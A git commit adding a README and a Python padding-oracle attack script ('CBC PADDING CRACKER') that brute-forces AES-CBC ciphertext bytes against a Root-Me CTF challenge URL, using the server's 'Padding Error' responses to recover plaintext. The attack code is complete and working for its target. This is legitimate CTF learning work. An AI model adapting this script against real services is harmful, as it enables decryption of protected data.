82cc5921be791763802660ac50200b0da1eda8fa
b3liott <eliott.georges8@gmail.com>
2024-11-28 15:55:31 +0100

    first commit

---
+++ README.md
@@ -0,0 +1,5 @@
+# CBC PADDING CRACKER
+
+This python script exploits the padding vulnerability of AES CBC encryption.
+It was designed to solve a CTF challenge, so it's not really usable in any context other than the one we've faced.
+However you can read it to understand how I implemented it. 
---
+++ cbc-cracker.py
@@ -0,0 +1,215 @@
+import requests
+import os
+
+
+URL = "http://challenge01.root-me.org/realiste/ch12/index.aspx"
+
+s1 = "Padding Error"
+s2 = "File not found"
+s3 = "Page OK"
+
+ORANGE = "\033[38;5;214m"
+WHITE = "\033[37m"
+GREEN = "\033[32m"
+RED = "\033[31m"
+
+HEX_BYTES = []
+
+for i in range(256):
+    hex_value = f"{i:02X}"
+    HEX_BYTES.append(hex_value)
+
+
+def getNextCypher(page_name="Home"):
+    res = requests.get(URL).text
+    home_index = res.index(f">{page_name}</a>")
+    return res[home_index-65:home_index-1]
+
+def getRessource(ressource):
+    return requests.get(URL+"?c="+ressource).text
+
+def paddingStatus(response):
+    if response.__contains__(s1):
+        return s1
+    elif response.__contains__(s2):
+        return s2
+    else:
+        return s3
+
+def getBlockSize():
+    cypher = getNextCypher()
+
+    if (len(cypher)//2)%16 == 8: return 8
+    
+    test_pad = cypher + cypher[-16*2:]  # 2 letters = 1 byte
+
+    a = getRessource(test_pad)
+    if paddingStatus(a) == s1:
+        return 16
+    else:
+        return 8
+
+def hex_to_binary(hex_str):
+    decimal_value = int(hex_str, 16)
+    binary_str = bin(decimal_value)[2:]
+    return binary_str
+
+def getBlocks(block_size, cypher):
+    blocks = []
+    block = ""
+    for k in range(len(cypher)):
+        if (k+1)%(block_size*2) == 1 and k != 0:
+            blocks.append(block)
+            block = ""
+        block += cypher[k]
+    blocks.append(block)
+
+    return blocks
+
+def blockToCypher(blocks):
+    c = ""
+    for b in blocks:
+        c += b
+    return c
+
+def modifyBlock(block, val, blocks, ind):
+    assert(len(blocks[block]) > ind and len(blocks) > block and ind > 0)
+    pre = blocks[block][:ind-1] 
+    if len(blocks[block]) > ind+1:
+        su = blocks[block][ind+1:]
+        res = pre+val+su
+    else:
+        res = pre+val
+
+    blocks[block] = res
+
+
+# def paddingSlideTest():
+#     # tester la taille du padding en modifiant petit à petit les valeurs à la fin
+#     n = len(b)
+#     counter = 1
+#     for i in range(1, n+1):
+#         for j in range(block_size*2 - 1, 0, -2):
+#             current_val = b[n-i][j-1:j+1]
+#             hb2 = HEX_BYTES.copy()
+#             hb2.remove(current_val)
+#             new_cypher = blockToCypher(modifyBlock(n-i, hb2[0], b.copy(), j))
+#             printable_cypher = blockToCypher(modifyBlock(n-i, f"{ORANGE}{hb2[0]}{WHITE}", b.copy(), j))
+#             status = paddingStatus(getRessource(new_cypher))
+#             print(status, printable_cypher, " Byte: ", counter)
+#             counter += 1
+
+def guess(c, x, pad, block_size, Pn, Dn):
+    # we have x^d = pad (valid padding)
+    # hence d = pad^x
+    # and we have c^d = plain
+    int_x = int(x, 16)
+    int_c = int(c, 16)
+    int_d = pad ^ int_x
+
+    Pn[block_size-pad], Dn[block_size-pad] = int_c ^ int_d, int_d
+
+def fuzzCk(k=0):
+    n = len(b)
+    pad_step = 1  # always = j+1
+    to_print = f"Block: {k+1}\n"
+    s = ""
+    ok = False
+    Pn = [0]*block_size
+    Dn = [0]*block_size
+    SIZE = block_size*2
+
+    for j in range(SIZE - 1, 0, -2):
+        current_val = b[k][j-1:j+1]
+        blocks = b.copy()
+
+        # if we are at at least padding 0x02
+        for p in range(pad_step-1):
+            # we modify d to generate a valid padding
+            block_ind = SIZE - 2*p - 1
+            valid_padding = Dn[block_size-p-1] ^ (pad_step)
+            modifyBlock(k, f"{valid_padding:02X}", blocks, block_ind)
+        
+        for val in HEX_BYTES:
+            blocks_cpy = blocks.copy()
+
+            # now, d values will generate a valid padding
+            # we have to bruteforce the next one to have a valid padding
+            modifyBlock(k, val, blocks_cpy, j)
+            new_cypher = blockToCypher(blocks_cpy)
+
+            # copy of blocks to have a fancy print
+            modifyBlock(k, f"{ORANGE}{val}{WHITE}", bcpy:=blocks_cpy.copy(), j)
+            printable_cypher = blockToCypher(bcpy)
+
+            # verify wether or not the oracle validated the padding
+            status = paddingStatus(getRessource(new_cypher))
+            s = f"{status} {printable_cypher} Byte: {block_size-pad_step+1}\n"
+            os.system('cls' if os.name == 'nt' else 'clear')
+            print(f"{to_print}{s}")
+            if status != s1: # and val != current_val:
+                ok = True
+                break
+        
+        to_print += f"{GREEN if ok else RED}{status} {new_cypher} {val if ok else None} Byte {block_size-pad_step+1}{WHITE}\n"
+        os.system('cls' if os.name == 'nt' else 'clear')
+        if ok:
+            guess(c=current_val, x=val, pad=pad_step, block_size=block_size, Pn=Pn, Dn=Dn)
+            to_print += f"Found d[{block_size-pad_step+1}]={hex(Dn[block_size-pad_step])} and p[{block_size-pad_step+1}]={hex(Pn[block_size-pad_step])}\n"
+        
+        print(to_print)
+
+        ok = False
+        pad_step += 1   
+
+    return Pn
+
+
+ban = """
+
+---------------------------------------------------------------------------------
+
+ ██████╗██████╗  ██████╗    ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗     
+██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     
+██║     ██████╔╝██║         ██████╔╝███████║██║  ██║██║  ██║██║██╔██╗ ██║██║  ███╗    
+██║     ██╔══██╗██║         ██╔═══╝ ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║██║   ██║    
+╚██████╗██████╔╝╚██████╗    ██║     ██║  ██║██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝    
+ ╚═════╝╚═════╝  ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     
+                                                                                      
+            ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗                               
+            ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                              
+            ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝                              
+            ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗                              
+            ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║                              
+            ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                              
+
+
+----------------------------------By @b3liott------------------------------------                                                                                               
+
+"""
+
+if __name__ == "__main__":
+    print(ban)
+    block_size = getBlockSize()
+    print("Taille des blocks: ", block_size)
+    # s = getNextCypher()
+    s = "5D8B334658592F16ED2F130AEC65423A3F880A41630AC7929E72A583CACAF8AF"
+    print("Cypher sample: ", s)
+    print("Blocks: ", b:=getBlocks(block_size, s))
+    
+    print("Choose an option:")
+    try:
+        choice = int(input("1 - Decrypt\n2 - Craft\n"))
+    except Exception as e:
+        print("Error: ", e)
+        exit(1)
+
+    if choice == 1:
+        Pn = fuzzCk()
+
+        print("-----------")
+        message = ""
+        for v in Pn:
+            message += chr(v)
+
+        print(f"{GREEN} ----------------------- DECRYPTED MESSAGE: {message} -----------------------{WHITE}")
